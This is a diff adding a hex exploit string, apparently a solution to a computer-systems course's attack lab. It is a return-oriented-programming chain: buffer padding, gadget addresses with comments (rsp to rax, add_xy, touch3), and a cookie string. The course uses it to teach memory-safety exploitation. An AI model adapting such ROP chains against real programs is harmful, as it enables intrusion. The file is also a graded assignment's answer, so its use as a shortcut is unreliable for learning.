@@ -1,0 +1,18 @@
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+16 28 40 00 00 00 00 00 /* moving rsp to rax */
+e4 27 40 00 00 00 00 00 /* moving rax into rdi */
+9a 27 40 00 00 00 00 00 /* pop %rax */
+48 00 00 00 00 00 00 00 /* adding 72 bits to account for buffer for following 6 lines */
+b6 28 40 00 00 00 00 00 /* moving eax to ecx */
+01 28 40 00 00 00 00 00 /* moving ecx to edx */
+d6 28 40 00 00 00 00 00 /* moving edx to esi */
+f2 27 40 00 00 00 00 00 /* address for add_xy */
+e4 27 40 00 00 00 00 00 /* moving rax into rdi */
+ec 26 40 00 00 00 00 00 /* address of touch3 */
+37 61 39 33 62 34 65 65 /* cookie string */
